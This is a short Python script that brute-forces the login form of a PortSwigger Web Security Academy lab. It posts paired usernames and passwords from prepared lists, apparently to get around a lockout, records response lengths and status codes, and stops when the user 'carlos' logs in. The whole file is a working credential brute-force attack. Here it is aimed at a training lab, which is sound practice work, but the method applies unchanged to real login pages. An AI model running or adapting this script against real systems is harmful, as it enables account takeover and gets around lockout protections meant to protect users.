import requests
import sys

URL_LOGIN = 'https://0acf00db045606e082938da8007f0028.web-security-academy.net/login'


proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

payload = {
    'username': '',
    'password': '',
}

usernames = open('modified_user_list.txt', 'r', encoding='utf-8').read().strip().split('\n')
passwords = open('modified_pass_list.txt', 'r', encoding='utf-8').read().strip().split('\n')

session = requests.Session()


# Bruteforce with modified list
def brute_force_pass():
    with open('validate_password.txt', 'w', encoding='utf-8') as f:
        f.write('password,length,status_code\n')
        for username, password in zip(usernames, passwords):
            payload['username'] = username
            payload['password'] = password
            req = session.post(URL_LOGIN, data=payload, headers=headers, allow_redirects=False)

            f.write(f"{password},{len(req.content)},{req.status_code}\n")
            print(username, password, req.status_code)

            if username == 'carlos' and req.status_code == 302:
                print('[+] Successful bruteforce \'carlos\' pass')
                print(f'Password: {password}')
                return 
    print('[-] Not found \'carlos\' pass in the list')
    sys.exit()
    
def main():
    brute_force_pass()


if __name__ == '__main__':
    main()
